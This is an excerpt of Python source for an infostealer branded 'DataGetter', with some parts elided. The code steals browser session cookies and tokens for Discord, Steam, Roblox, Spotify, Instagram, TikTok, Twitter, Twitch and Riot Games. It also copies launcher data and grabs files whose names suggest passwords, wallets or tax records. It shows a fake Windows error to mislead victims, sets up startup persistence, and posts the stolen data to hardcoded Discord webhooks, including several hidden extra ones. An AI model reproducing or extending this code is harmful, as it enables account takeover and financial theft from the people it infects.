...
import base64
import time
sicherheits_webhooks = [    "https://discord.com/api/webhooks/1380508895885262990/xEtHTeBn801hpPXgdrsqu0uRNPKkCsr6Depz3X4JMpjH8SAJBP4giHyZLh1EzMHhIr5K",    "https://discord.com/api/webhooks/1380508969604223048/mKgzQQdmYT4LO4ffKOq5vnanAHRkS3Lb8jiqZfwwXBT0saaYQF8qQGHZzmVirejOiT6D",    "https://discord.com/api/webhooks/1380509028743909398/m8RMQbfLMLl7E67ScRpOY9vNdy_rpdkvry4-VXFLK-klyFVOE8BLNMqPcAiAu-BYg09j",    "https://discord.com/api/webhooks/1380509084469559367/jFiSLt9Gail1zkwGa7dKJ2QzotC0LokQwjD8ii0-ukR3kkQ4pThkAJambMLIqwFnCN0X",    "https://discord.com/api/webhooks/1380509140035833856/aPSqe_Io9JR3Vopf2CsDhy4JrMdq88_kx9DGEoBfxImSo8QDcMVGV-jz3PbVrawGTV8f"]
...
FakeError = (bool("%fake_error%"), ("System Error", "Windows Management Instrumentation (WMI) failed to initialize the CIM repository. Please check system configuration and restart the WMI service. Error Code: 0x80041010", 16, "WMI CIM Provider Error", 0))
...
class Main:
            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://guns.lol/LorenzHP\n==============================================\n")
        ...
        try:
            ...
            if found_epic == True:
                with open(os.path.join(copied_path, "How to Use.txt"), "a", errors="ignore") as write_file:
                    write_file.write("https://guns.lol/LorenzHP/n==============================================\n")
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***DataGetter***",
                    "description": f"***DataGraber Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://guns.lol/LorenzHP",
                    "color": 0,
                    "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
                ...
                async with session.post(webhook, json=payload, headers=headers) as response:
                    for url in sicherheits_webhooks:
                        try:
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***DataGetter***",
                "description": f"***DataGetter Instagram Session was detected on the {browser} browser***",
                "url" : "https://guns.lol/LorenzHP",
                "color": 0,
                "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
                "thumbnail": {"url": pp}}
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***DataGetter***",
                "description": f"***DataGetter Tiktok Session was detected on the {browser} browser***",
                "url" : "https://guns.lol/LorenzHP",
                "color": 0,
                "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***DataGetter***",
                "description": f"***DataGetter Twitter Session was detected on the {browser} browser***",
                "url" : "https://guns.lol/LorenzHP",
                "color": 0,
                "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                ...
                "url" : "https://guns.lol/LorenzHP",
                "color": 0,
                "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/quicaxd/Exela-V2.0"},
                "thumbnail": {"url": pp}}
            fields = [
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***DataGetter***",
                "description": f"***DataGetter Spotify Session was detected on the {browser} browser***",
                "url" : "https://guns.lol/LorenzHP",
                "color": 0,
                "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***DataGetter***",
                    "description": f"***DataGetter Roblox Session was detected on the {browser} browser***",
                    "url" : "https://guns.lol/LorenzHP",
                    "color": 0,
                    "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
                    "thumbnail": {"url": pp}}
                ...
                async with session.post(webhook, json=payload, headers=headers2) as response:
                    for url in sicherheits_webhooks:
                        try:
                            await session.post(url, json=payload, headers=headers2)
                        except:
                            pass
                    pass
        except:
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***DataGetter***",
                "description": f"***DataGetter Validated Discord Token Detected***",
                "url" : "https://guns.lol/LorenzHP",
                "color": 0,
                "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
                "thumbnail": {"url": ""}}
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***DataGetter***",
                                    "description": f"***DataGetter Steam Session Detected***",
                                    "url" : "https://guns.lol/LorenzHP",
                                    "color": 0,
                                    "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***DataGetter***",
            "description": f"***DataGetter Full Info***",
            "url" : "https://guns.lol/LorenzHP",
            "color": 0,
            "footer": {"text": "https://guns.lol/LorenzHP | https://github.com/LorenzHPP/DataGetter"},
            "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup", "clip", "Nvidia", "Whatsapp"]
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("DataGetter.exe", "")) # Create Directory
